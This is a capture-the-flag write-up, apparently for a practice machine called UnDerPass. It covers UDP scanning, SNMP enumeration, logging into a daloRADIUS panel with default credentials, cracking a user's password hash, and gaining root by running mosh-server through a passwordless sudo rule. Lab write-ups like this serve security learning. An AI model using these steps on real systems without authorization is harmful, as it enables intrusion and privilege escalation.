{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("The initial enumeration was very confusing and I haven't encountered anything similar previously.")}}

{{text("What we were supposed to do is to scan the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>UDP ports</code> by using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>-sU</code> flag.")}}

{{console("nmap -T5 -p- -sU 10.10.11.48", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 18:37 CET
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Stats: 0:04:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 97.34% done; ETC: 18:42 (0:00:07 remaining)
Nmap scan report for 10.10.11.48
Host is up (0.066s latency).
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 293.21 seconds")}}

{{text("The scan reveals one open port with the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>snmp</code> service running.")}}

{{text("We can use the tool named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>snmpbulkwalk</code> to communicate with the service.")}}

{{text("An example can be found here.")}}

{{link("https://www.mkssoftware.com/docs/man1/snmpbulkwalk.1.asp", "https://www.mkssoftware.com/favicon.ico", "snmpbulkwalk | communicates with a network entity using SNMP BULK requests")}}

{{console("snmpbulkwalk 10.10.11.48 -c public -v2c", "iso.3.6.1.2.1.1.1.0 = STRING: 'Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64'
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (151363) 0:25:13.63
iso.3.6.1.2.1.1.4.0 = STRING: 'steve@underpass.htb'
iso.3.6.1.2.1.1.5.0 = STRING: 'UnDerPass.htb is the only daloradius server in the basin!'
iso.3.6.1.2.1.1.6.0 = STRING: 'Nevada, U.S.A. but not Vegas'
...")}}

{{text("We find an e-mail and a string about a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>daloradius</code> server.")}}

{{header("Shell as svcMosh", "shell-as-svcmosh")}}

{{text("I searched where the admin panel of this server would be and found out it's at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://IP_ADDRESS/daloradius/app/operators</code>.")}}

{{image("../../static/writeups/underpass/images/000001.jpg")}}

{{text("I also found the default credentials which were <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>administrator:radius</code>. I tried using them and they worked.")}}

{{image("../../static/writeups/underpass/images/000002.jpg")}}

{{text("By finding the listing of user's, I obtained a hashed user password. I proceeded to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hashes.com</code> and got the password of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>svcMosh</code>.")}}

{{image("../../static/writeups/underpass/images/000003.jpg")}}

{{text("Using this username and password combination allowed me to log in via SSH.")}}

{{image("../../static/writeups/underpass/images/000004.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since I knew my user's password, first thing I did was checking his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server")}}

{{text("After reading the documentation, I created a new mosh-server instance.")}}

{{console("sudo /usr/bin/mosh-server new -p 60000", "

MOSH CONNECT 4444 0JF1yAqERJKSxkD9RH6/Zw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2935]")}}

{{text("And then used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>mosh-client</code> to connect to it.")}}

{{console("MOSH_KEY=0JF1yAqERJKSxkD9RH6/Zw mosh-client 127.0.0.1 60000")}}

{{text("By using these commands, I was able to become root on the machine.")}}

{{image("../../static/writeups/underpass/images/000005.jpg")}}

{{script()}}